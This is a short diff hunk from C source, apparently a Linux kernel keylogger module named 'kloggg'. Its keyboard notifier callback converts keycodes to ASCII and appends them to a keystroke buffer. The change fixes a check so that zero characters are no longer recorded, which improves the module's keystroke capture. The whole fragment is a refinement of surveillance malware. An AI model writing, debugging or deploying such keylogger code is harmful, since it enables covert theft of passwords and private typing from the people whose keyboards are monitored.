@@ -75,7 +75,7 @@ static int kloggg_log(struct notifier_block *nb, unsigned long action, void *dat
     unsigned int keycode = param->value;
     int shift_mask = param->shift;
     char c = kloggg_keycode_to_ascii(keycode, shift_mask);
-    if (c < 128) {
+    if (c > 0 && c < 128) {
       keybuf[keybuf_pos++] = c;
       if (keybuf_pos >= KEYBUF_LEN) {
         int half = KEYBUF_LEN / 2;
